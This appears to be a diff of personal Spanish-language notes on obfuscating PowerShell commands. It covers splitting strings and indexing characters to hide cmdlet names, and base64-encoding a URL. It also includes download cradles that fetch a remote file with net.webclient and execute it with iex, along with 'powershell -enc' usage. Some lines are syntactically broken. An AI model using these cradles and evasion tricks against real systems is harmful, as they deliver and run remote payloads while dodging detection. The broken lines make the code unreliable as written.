@@ -27,10 +27,10 @@ $test = (New-Object net.webclient).DownloadString('')
 Windows Manager Instrumentation
 powershell ipconfig
 powershell Get-WmiObject -class win32_computersystem
----------------------------------------------------------------------------
+
 $XTZ = $env:LOCALAPPDATA[0,23,21,7,7] -join '' join parseo puedes meterle , :
 powershell Get-WmiObject -$XTZ win32_computersystem "string CLASS ofuscation"
---------------------------------------------------------------------------
+
 $gato = "Get-WmiObject -class win32_computersystem"
 $perro = $gato.Split("#") -join ''
 powershell $perro
@@ -38,15 +38,33 @@ powershell $perro
 $gato = "Get-W#mi#O#b#j#ect -c#l#a#s#s w#i#n#3#2#_#c#o#m#putersystem"
 $perro = $gato.Split("#") -join ''
 powershell $perro
------------------------------------------------------------------------------
-ejecutar comandos desde un host remoto
+
+
+1 - ejecutar comandos desde un host remoto
 $test = Get-Process | Format-List -Property name,path  save as 1.png or 1.jpg and upload to server
 $test = (New-Object net.webclient).DownloadString('http://ip/perro.png')
 iex $test
------------------------------------------------------------------------------
-$pepe = $test = (New-Object net.webclient).DownloadString('https://www.google.es')
-$link = "https://www.google.es"
-$perro2 = [System.Text.Encoding]::Unicode.GetBytes($link)
-$code = [convert]::ToBase64String($perro2)
+
+2- $str = "http://google.es/perro.png"
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+
+$link = "aAB0AHQAcAA6AC8ALwBnAG8AbwBnAGwAZQAuAGUAcwAvADEALgBwAG4AZwA="
+$decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($link)
+$pepe = (New-Object net.webclient).DownloadString($decode)
+iex $pepe
+-----
+$text = "hola muindo"
+$bytes =  [System.Text.Encoding]::Unicode.GetBytes($text)
+$EncodedText = [Convert]::ToBase64String($Bytes)
+$EncodedText
+
+aABvAGwAYQAgAG0AdQBpAG4AZABvAA==
+
+$text = "aABvAGwAYQAgAG0AdQBpAG4AZABvAA=="
+$decode= [System.text.encoding]::Unicode.GetString([system.convert]::Frombase64String($text))
+$decode 
+------
+powershell -enc base64
+
 
 
